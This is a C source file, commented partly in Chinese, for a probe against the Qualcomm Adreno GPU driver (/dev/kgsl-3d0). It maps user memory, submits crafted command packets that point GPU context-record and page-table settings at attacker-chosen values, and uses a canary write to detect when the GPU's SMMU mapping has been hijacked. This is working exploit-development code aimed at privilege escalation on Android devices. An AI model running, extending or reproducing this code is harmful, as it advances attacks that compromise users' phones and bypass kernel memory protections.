/* kgsl_recscan.c — payload[2](上下文记录基址)扫描
 * IB = {0xD3(4){ttbr_lo=0, ttbr_hi=0, rec=X, flags=0}}
 * handler 0x143e 从 rec+0x320/0x354... load 配置 → 编程 SMMU
 * oracle: canary(真映射 ib+0x800 写) — EDEADLK=FAULT; landed=LAND; else=GHOST
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include "adrenaline.h"

static int fd;
static uint64_t g_clsz;
static uint32_t *ib;
static uint64_t ib_ga;
static uint32_t ctx;

static void cache_op(void *s, void *e, int inv) {
    s = (char*)((uintptr_t)s & ~(g_clsz - 1));
    for (; s < e; s += g_clsz) {
        if (inv) __asm volatile("dc civac, %0" : : "r" (s) : "memory");
        else     __asm volatile("dc cvac, %0"  : : "r" (s) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}
static void ctx_create(void) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, _IOWR(0x09, 0x13, struct kgsl_drawctxt_create), &req);
    if (!r) ctx = req.drawctxt_id;
}
static void ctx_recreate(void) {
    ioctl(fd, _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy),
          &(struct kgsl_drawctxt_destroy){ .drawctxt_id = ctx });
    ctx_create();
}
static int gpu_command(uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, _IOWR(0x09, 0x4A, struct kgsl_gpu_command), &req);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return 1;
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) return 1;
    ib_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx\n", (unsigned long long)ib_ga);
    ctx_create();
    printf("# ctx=%u\n", ctx);

    uint32_t start = argc > 1 ? (uint32_t)strtoul(argv[1], NULL, 0) : 0;
    uint32_t count = argc > 2 ? (uint32_t)strtoul(argv[2], NULL, 0) : 256;

    for (uint32_t X = start; X < start + count; X++) {
        /* 探针: switch(payload[2]=X) */
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0xD3, 4);
        *c++ = 0; *c++ = 0;              /* ttbr = 0 */
        *c++ = X;                        /* 记录基址 */
        *c++ = 0;                        /* flags */
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x100, 0);
        int r = gpu_command(ib_ga, 20);
        if (r) { ctx_recreate(); r = gpu_command(ib_ga, 20); }
        usleep(30000);
        /* canary */
        c = ib;
        uint32_t cv = 0xA5A5A500u | (X & 0xFF);
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
        *c++ = lower_32_bits(ib_ga + 0x800); *c++ = upper_32_bits(ib_ga + 0x800);
        *c++ = cv;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x100, 0);
        int rc = gpu_command(ib_ga, 16);
        int st;
        if (rc) { st = 0; ctx_recreate(); }
        else {
            usleep(20000);
            cache_op((uint8_t*)ib + 0x800, (uint8_t*)ib + 0x804, 1);
            uint32_t got = ib[0x200];
            ib[0x200] = 0;
            cache_op((uint8_t*)ib + 0x800, (uint8_t*)ib + 0x804, 0);
            st = (got == cv) ? 1 : 2;
        }
        if (st != 0)
            printf("rec=0x%04x: %s\n", X, st == 1 ? "LAND(SMMU=映射ib的表)" : "GHOST(翻译到别处/丢弃)");
        if ((X - start) % 256 == 0)
            printf("  .. rec=0x%04x done\n", X);
    }
    printf("done\n");
    return 0;
}
